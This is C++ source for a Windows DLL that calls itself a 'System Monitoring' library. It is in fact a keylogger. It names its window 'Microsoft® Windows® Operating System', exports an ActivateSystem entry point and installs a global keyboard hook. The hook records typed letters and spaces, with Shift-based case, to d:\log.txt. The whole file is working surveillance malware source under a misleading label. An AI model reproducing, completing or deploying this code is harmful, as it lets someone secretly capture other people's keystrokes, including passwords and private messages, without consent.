
// Library for System Monitoring
// Written by Arjun Menon

#include <windows.h>
#include <fstream.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

static char szAppName[] = "Microsoft® Windows® Operating System" ;
int WINAPI StartSystem(HINSTANCE hInstance, 
					   HINSTANCE hPrevInstance, 
					   PSTR szCmdLine, int nCmdShow)
{
     HWND        hwnd ;
     MSG         msg ;
     WNDCLASS    wndclass ;
	 LRESULT CALLBACK WndProc (HWND hwnd, UINT message,
		 WPARAM wParam, LPARAM lParam);

     wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
     wndclass.lpfnWndProc   = WndProc ;
     wndclass.cbClsExtra    = 0 ;
     wndclass.cbWndExtra    = 0 ;
     wndclass.hInstance     = hInstance ;
     wndclass.hIcon         = LoadIcon (NULL, IDI_WINLOGO) ;
     wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW) ;
     wndclass.hbrBackground = (HBRUSH) GetStockObject (WHITE_BRUSH) ;
     wndclass.lpszMenuName  = NULL ;
     wndclass.lpszClassName = szAppName ;
     
     if (!RegisterClass (&wndclass))
          return 0 ;
     
     hwnd = CreateWindow (szAppName, szAppName,
                          WS_OVERLAPPEDWINDOW,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          NULL, NULL, hInstance, NULL) ;

	 ShowWindow(hwnd, nCmdShow);

     while (GetMessage (&msg, NULL, 0, 0))
     {
          TranslateMessage (&msg) ;
          DispatchMessage (&msg) ;
     }

     return msg.wParam ;
}

void StartSensing();

LRESULT CALLBACK WndProc (HWND hwnd, UINT message,
						  WPARAM wParam,LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		remove("d:\\log.txt");
		StartSensing();
		break;
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage (0) ;
		return 0 ;
	}
	return DefWindowProc (hwnd, message, wParam, lParam) ;
}

HANDLE hDLL = NULL;

int WINAPI DllMain(HANDLE hModule,
				   DWORD ul_reason_for_call,
				   LPVOID lpReserved)
{
	hDLL = hModule;

	return TRUE;
}

__declspec(dllexport) void ActivateSystem
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	StartSystem((HINSTANCE)hDLL, NULL, "", SW_NORMAL);
}

void StartSensing()
{
	HHOOK KeylogHook = NULL;
	LRESULT CALLBACK KeyboardHookProc
	(int code, WPARAM wParam, LPARAM lParam);
	KeylogHook = SetWindowsHookEx
	(WH_KEYBOARD,(HOOKPROC)KeyboardHookProc,(HINSTANCE)hDLL,NULL);
}

LRESULT CALLBACK KeyboardHookProc
(int code, WPARAM wParam, LPARAM lParam)
{
	ofstream out;
	out.open("d:\\log.txt",ofstream::out | ofstream::app);

	if(lParam >> 31) {
		MessageBeep(-1);
		if (((wParam>45) && (wParam<91)) || (wParam==32))
		{
			char k = (char)(wParam);
			BOOL casematch = FALSE;
			SHORT a = GetKeyState(VK_SHIFT);
 			if (a < 0) casematch = TRUE;
			else       casematch = FALSE;
			if (casematch==FALSE) 
				k = tolower(k);
			if (casematch==TRUE)
				k = toupper(k);
			out<<k;
		}
	}

	out.close();
	flush(out);  

	return CallNextHookEx(NULL, code, wParam, lParam);
}
